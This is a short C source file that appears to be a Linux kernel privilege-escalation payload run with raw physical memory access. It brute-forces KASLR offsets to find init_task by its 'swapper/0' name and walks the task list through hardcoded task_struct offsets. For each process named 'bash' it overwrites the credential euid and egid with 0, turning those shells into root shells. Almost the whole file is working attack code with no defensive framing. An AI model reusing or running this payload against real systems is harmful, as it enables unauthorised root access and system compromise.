#define virt_to_phys(VA) (((VA) & 0xFFFFFFF) + 0x30000000)

#define    linux_name   0xa30
#define    linux_tasks  0x788
#define    linux_mm     0x7d8
#define    linux_pid    0x888
#define    linux_pgd    0x040
#define    linux_cred   0xa28

#include <stdint.h>

void foo()
{
// 0x10500: init_task from System.map
// 0xa30: task_struct->comm
uint32_t p = 0x10500 + linux_name;
uint32_t *init_task;
char *cur;
char *procname;
char *tmp;
uint32_t *pid;
uint32_t *cred_pointer;
char *cred;
uint32_t *euid;
uint32_t *egid;
uint32_t *next_task;
uint32_t *next_pointer;

// linear search because of kalsr
for (uint32_t kalsr_offset = 0x100000; kalsr_offset <= 0x40000000; kalsr_offset += 0x100000) {
    cur = p + kalsr_offset;

    // found init_task
    if (0 == memcmp("swapper/0", cur, 9)) {
        // adjust to task_struct base
        cur -= linux_name;
        pid = cur + linux_pid;
        procname = cur + linux_name;
        next_pointer = cur + linux_tasks;
        next_task = virt_to_phys(*next_pointer - linux_tasks);
        init_task = cur;

while (1) {
        cur = next_task;
        pid = cur + linux_pid;
        cred_pointer = cur + linux_cred;
        cred = virt_to_phys(*cred_pointer);
        euid = cred + 0x14;
        egid = cred + 0x18;
        procname = cur + linux_name;
        next_pointer = cur + linux_tasks;
        next_task = virt_to_phys(*next_pointer - linux_tasks);

        uint32_t value = next_task;
        if (0 == ((value&0xFFFFF)-0x10500))
            break;

        if (0 == *pid)
            break;

        
        if (0 == memcmp("bash", procname, 4)) {
            *euid = 0;
            *egid = 0;
        }

}
        break;
    }
}

}
